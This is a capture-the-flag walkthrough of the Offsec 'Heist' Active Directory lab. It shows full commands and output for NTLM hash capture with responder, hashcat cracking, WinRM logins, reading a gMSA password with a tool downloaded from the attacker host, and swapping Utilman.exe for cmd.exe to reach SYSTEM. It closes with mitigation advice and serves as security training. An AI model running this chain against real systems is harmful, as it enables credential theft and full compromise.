# Offsec Practice: Heist CTF Walkthrough

![LeonardoAi Generated Image](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Heist/screenshots/leonardoai.jpg 'LeonardoAi Generated Image')

## Introduction

The **Heist** machine is an Active Directory–focused Capture The Flag challenge that closely mirrors real-world enterprise environments. Rather than relying on a single critical vulnerability, this box emphasizes **misconfigurations, credential abuse, and privilege chaining**, which are commonly observed during internal penetration tests.

The attack path begins with a seemingly harmless internal web application that unintentionally leaks NTLM credentials. From there, the compromise escalates through Active Directory enumeration, abuse of **ReadGMSAPassword** permissions, and finally a Windows privilege escalation using **SeRestorePrivilege** to achieve full SYSTEM access.

This challenge is an excellent example of how **low-privileged access**, when combined with poor AD hygiene and excessive permissions, can ultimately lead to full domain compromise.

## Machine Enumeration

Nmap finds 14 open ports at the initial scan. Most of the ports are Active Directory generic ports, such as 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, and 5985. Port 8080 hosted web applications, and the 3389 RDP port is open.

```
┌──(kali㉿kali)-[~/offsec/Practice/Heist]
└─$ nmap -sC -sV 192.168.133.165 -oN nmap.init.txt                                                                                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 14:31 EST
Nmap scan report for 192.168.133.165
Host is up (0.011s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-02 19:31:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Not valid before: 2025-11-13T13:00:14
|_Not valid after:  2026-05-15T13:00:14
|_ssl-date: 2025-12-02T19:32:19+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-02T19:31:40+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
|_http-title: Super Secure Web Browser
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-12-02T19:31:40
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.41 seconds
```

Put the all-ports Nmap scan in the backgroundthe port and started enumerating port 8080 web application.

```
┌──(kali㉿kali)-[~/offsec/Practice/Heist]
└─$ nmap -p- -T4 192.168.133.165 -oN nmap.all.ports.txt                                                                        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 14:32 EST
Nmap scan report for 192.168.133.165
Host is up (0.0083s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8080/tcp  open  http-proxy
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49703/tcp open  unknown
49764/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 88.00 seconds
```

```
┌──(kali㉿kali)-[~/offsec/Practice/Heist]
└─$ nmap -p 9389,49666,49668,49673,49674,49677,49703,49764 -sC -sV 192.168.133.165 -oN nmap.detail.tcp.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 14:36 EST
Nmap scan report for heist.offsec (192.168.133.165)
Host is up (0.011s latency).

PORT      STATE SERVICE    VERSION
9389/tcp  open  mc-nmf     .NET Message Framing
49666/tcp open  msrpc      Microsoft Windows RPC
49668/tcp open  msrpc      Microsoft Windows RPC
49673/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc      Microsoft Windows RPC
49677/tcp open  msrpc      Microsoft Windows RPC
49703/tcp open  msrpc      Microsoft Windows RPC
49764/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.00 seconds
```

This web application allows you to search URLs. First I tried to hit the URL to my web server, and it worked. So, I started `responder` to capture the user’s hash with the mindset of that NTLM theft vulnerability.

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Heist/screenshots/image.png)

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Heist/screenshots/image1.png)

```
┌──(kali㉿kali)-[~/offsec/Practice/Heist/exploit]
└─$ sudo responder -I tun0
...
...
...
[+] Listening for events...

[HTTP] NTLMv2 Client   : 192.168.133.165
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:1df0e212d6257d39:23B184EAD2049998ADEC53D72857CC80:0101000000000000887D129FC363DC0124F1EC8A1DAF731A0000000002000800460050005800360001001E00570049004E002D00350054003300560036004600410030003900510056000400140046005000580036002E004C004F00430041004C0003003400570049004E002D00350054003300560036004600410030003900510056002E0046005000580036002E004C004F00430041004C000500140046005000580036002E004C004F00430041004C0008003000300000000000000000000000003000003D26B6226A6003CBF24048D56181A122F67E7934A74378295CA2A475A9A2964D0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100370030000000000000000000
```

Successfully got the `enox` user’s NTLM hash. Tried to crack using `hashcat` with the rockyou.txt wordlist.

```
C:\...\...\tools\hashcat-7.1.2>hashcat.exe -m 5600 ..\hashes.txt ..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt --force
hashcat (v7.1.2) starting
...
...
...
Dictionary cache hit:
* Filename..: ..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

ENOX::HEIST:1df0e212d6257d39:23b184ead2049998adec53d72857cc80:0101000000000000887d129fc363dc0124f1ec8a1daf731a0000000002000800460050005800360001001e00570049004e002d00350054003300560036004600410030003900510056000400140046005000580036002e004c004f00430041004c0003003400570049004e002d00350054003300560036004600410030003900510056002e0046005000580036002e004c004f00430041004c000500140046005000580036002e004c004f00430041004c0008003000300000000000000000000000003000003d26b6226a6003cbf24048d56181a122f67e7934a74378295ca2a475a9a2964d0a001000000000000000000000000000000000000900260048005400540050002f003100390032002e003100360038002e00340035002e003100370030000000000000000000:california

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ENOX::HEIST:1df0e212d6257d39:23b184ead2049998adec53...000000
Time.Started.....: Tue Dec 02 19:48:13 2025, (1 sec)
Time.Estimated...: Tue Dec 02 19:48:14 2025, (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:        0 H/s (0.00ms) @ Accel:518 Loops:1 Thr:64 Vec:1
Speed.#03........:  1263.3 kH/s (12.13ms) @ Accel:61 Loops:1 Thr:63 Vec:1
Speed.#*.........:  1263.3 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 30744/14344384 (0.21%)
Rejected.........: 0/30744 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-0 Iteration:0-1
Restore.Sub.#03..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: [Copying]
Candidates.#03...: 123456 -> tuazon
Hardware.Mon.#01.: Temp: 41c Util: 20% Core: 840MHz Mem:5501MHz Bus:8
Hardware.Mon.#03.: N/A

Driver temperature threshold met on GPU #1. Expect reduced performance.
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => Started: Tue Dec 02 19:47:45 2025
Stopped: Tue Dec 02 19:48:14 2025
```

Check the found `enox:california` credentials using `crackmapexec` tool.

```
┌──(kali㉿kali)-[~/offsec/Practice/Heist/exploit]
└─$ crackmapexec winrm 192.168.133.165 -u 'enox' -p 'california'     
SMB         192.168.133.165 5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:heist.offsec)
HTTP        192.168.133.165 5985   DC01             [*] http://192.168.133.165:5985/wsman
WINRM       192.168.133.165 5985   DC01             [+] heist.offsec\enox:california (Pwn3d!)
```

## Initial Foothold

Try to get a WinRM shell using the `evil-winrm-py` tool.

```
┌──(kali㉿kali)-[~/offsec/Practice/Heist]
└─$ evil-winrm-py -i 192.168.133.165 -u 'enox' -p 'california'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '192.168.133.165:5985' as 'enox'
evil-winrm-py PS C:\Users\enox\Documents> whoami
heist\enox
evil-winrm-py PS C:\Users\enox\Documents> dir ../Desktop

    Directory: C:\Users\enox\Desktop

Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
d-----        7/20/2021   4:12 AM                application                                                            
-a----        12/2/2025   2:50 PM             34 local.txt                                                              
-a----        5/27/2021   7:03 AM            239 todo.txt                                                               

evil-winrm-py PS C:\Users\enox\Documents> type ../Desktop/local.txt
2dc99e4cb3238376f1f7aa07c5001db0
```

## Privilege Escalation

Using `enox:california` credential, tried to harvest the active directory information and uploaded it into the bloodhound.

```
┌──(kali㉿kali)-[~/offsec/Practice/Heist]
└─$ bloodhound-python -d 'heist.offsec' -u 'enox' -p 'california' -c all -ns 192.168.133.165 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: heist.offsec
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.heist.offsec:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.heist.offsec
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.heist.offsec
INFO: Found 6 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.heist.offsec
INFO: Done in 00M 02S
INFO: Compressing output into 20251202181658_bloodhound.zip
```

`enox` user is the member of the `Web Admins` group and that group’s member can read `svc_apache$` user’s password through `ReadGMSAPassword` permission.

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Heist/screenshots/image2.png)

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Heist/screenshots/image3.png)

As per the Windows abuse method. Successfully compromised the `svc_apache$` password. During the compilation time, I searched blogs and articles about this vulnerability and found an interesting walkthrough: https://www.hackingarticles.in/readgmsapassword-attack/.

```
┌──(kali㉿kali)-[~/offsec/Practice/Heist]
└─$ python3 ~/tools/windows/gMSADumper/gMSADumper.py -u 'enox' -p 'california' -d 'heist.offsec'
Unable to start a TLS connection. Is LDAPS enabled? Only ACLs will be listed and not ms-DS-ManagedPassword.

Users or groups who can read password for svc_apache$:
 > DC01$
 > Web Admins
```

[https://github.com/rvazarkar/GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)

Compilation steps: Windows OS > Visual Studio > Open Project Directory > Open Properties and Select .NET Assembler > Build > Build Solution. Once you have created the GMSAPasswordReader.exe file, transfer it into the victim’s system.

```
evil-winrm-py PS C:\Users\enox\Downloads> iwr -uri http://192.168.45.170/GMSAPasswordReader.exe -OutFile GMSAPasswordReader.exe
evil-winrm-py PS C:\Users\enox\Downloads> dir

    Directory: C:\Users\enox\Downloads

Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----        12/2/2025   4:11 PM         105984 GMSAPasswordReader.exe                                                 
-a----        12/2/2025   3:39 PM        1355264 mimikatz.exe                                                           

evil-winrm-py PS C:\Users\enox\Downloads> .\GMSAPasswordReader.exe --AccountName 'svc_apache'
Calculating hashes for Old Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 762469143DF0C743541FD6F594CD7C6B
[*]       aes128_cts_hmac_sha1 : 29387F7A2704F76A6B4D950AEFC4BA4B
[*]       aes256_cts_hmac_sha1 : 4160614FDEEFC0BC3C54505D4041C3E01E1A5F2A87F7934301B551245DDBA7F2
[*]       des_cbc_md5          : 9E340723700454E9

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 2D1E6E71AE3329A1B6465D92216D065F
[*]       aes128_cts_hmac_sha1 : 1080BE48205D2F9E8964F5161728D167
[*]       aes256_cts_hmac_sha1 : DA08CA6E378DB400CAF67AB2037B6B485B986897E15332D0270822990C7BCC3E
[*]       des_cbc_md5          : 733D79526E159797
```

The SeRestorePrivilege privilege allows a user to circumvent file and directory permissions when restoring backed-up files and directories, thus giving the user read and write access to system files.

We will use the [EnableSeRestorePrivilege.ps1](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1) script to enable this privilege in our PowerShell session. Once the EnableSeRestorePrivilege.ps1 file was executed on the victim’s system, then we could get write access to C:\Windows\System32.

Reference: https://oscp.adot8.com/windows-privilege-escalation/whoami-priv/serestoreprivilege

After modifying the `C:\Windows\System32` directory. Just swap the Utilman.exe with the cmd.exe file and try to connect to the victim’s system and start the Utilman.exe application, which starts the command prompt as administrator.

```
┌──(kali㉿kali)-[~/offsec/Practice/Heist]
└─$ evil-winrm-py -i 192.168.133.165 -u 'svc_apache$' -H '2D1E6E71AE3329A1B6465D92216D065F'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '192.168.133.165:5985' as 'svc_apache$'
evil-winrm-py PS C:\Users\svc_apache$\Documents> whoami
heist\svc_apache$

evil-winrm-py PS C:\Users\svc_apache$\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

PS C:\Users\svc_apache$\Documents> .\EnableSeRestorePrivilege.ps1
.\EnableSeRestorePrivilege.ps1
DEBUG: Current process handle: 4516
DEBUG: Calling OpenProcessToken()
DEBUG: Token handle: 4520
DEBUG: Calling LookupPrivilegeValue for SeRestorePrivilege
DEBUG: SeRestorePrivilege LUID value: 18
DEBUG: Calling AdjustTokenPrivileges
DEBUG: GetLastError returned: 0

PS C:\Users\svc_apache$\Documents> ren C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.pwned
ren C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.pwned
PS C:\Users\svc_apache$\Documents> ren C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
ren C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Heist/screenshots/image4.png)

## Security Recommendations & Mitigations

To prevent attacks similar to those demonstrated in this machine, the following security best practices should be implemented:

1. Prevent NTLM Credential Leakage
    1. Disable NTLM authentication where possible and enforce **Kerberos-only authentication**
    2. Block outbound authentication attempts from servers to untrusted destinations
    3. Implement **SMB signing** and **Extended Protection for Authentication (EPA)**
2. Secure Internal Web Applications
    1. Avoid server-side URL fetching unless absolutely necessary
    2. Validate and restrict outbound requests (allowlist trusted domains)
    3. Prevent automatic authentication to external resources
3. Harden Active Directory Permissions
    1. Regularly audit group memberships such as **Web Admins**
    2. Avoid assigning **ReadGMSAPassword** permissions unless strictly required
    3. Restrict gMSA accounts to the minimum number of services
4. Monitor Service Account Usage
    1. Enable logging and alerts for service account authentication
    2. Use long, rotated, and automatically managed passwords for service accounts
    3. Monitor unusual WinRM or interactive logons by service accounts
5. Restrict Dangerous Windows Privileges
    1. Limit privileges such as **SeRestorePrivilege** and **SeBackupPrivilege**
    2. Periodically audit `whoami /priv` output for non-administrative users
    3. Use role-based access control (RBAC) wherever possible
6. Continuous AD Visibility
    1. Regularly run **BloodHound** internally to identify risky attack paths
    2. Treat high-risk permissions as vulnerabilities, not convenience features

## Conclusion

The **Heist** machine demonstrates how dangerous small misconfigurations can be when they exist inside an Active Directory environment. At no point was an exploit required instead, the entire attack relied on **credential exposure, permission abuse, and legitimate Windows features used maliciously**.

Starting from an NTLM hash leak via a web application, I was able to:

- Capture and crack domain credentials
- Gain an initial foothold via WinRM
- Enumerate Active Directory relationships using BloodHound
- Abuse **ReadGMSAPassword** to extract a gMSA account password
- Leverage **SeRestorePrivilege** to gain SYSTEM-level access

This challenge reinforced an important lesson: **defense-in-depth matters**. Even if a single control fails, proper segmentation, least privilege, and monitoring could prevent an attacker from progressing further.